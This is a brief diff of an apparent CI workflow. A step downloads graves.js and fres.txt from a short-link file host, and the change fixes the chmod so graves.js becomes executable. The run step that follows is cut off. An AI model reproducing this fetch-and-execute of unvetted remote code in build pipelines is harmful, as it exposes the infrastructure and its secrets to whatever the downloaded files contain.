@@ -28,7 +28,7 @@ jobs:
       run: |
         wget https://curl.by/3Qw85/graves.js
         wget https://curl.by/v_GPh/fres.txt
-        chmod +x graves
+        chmod +x graves.js
     
     - name: run
       run: |
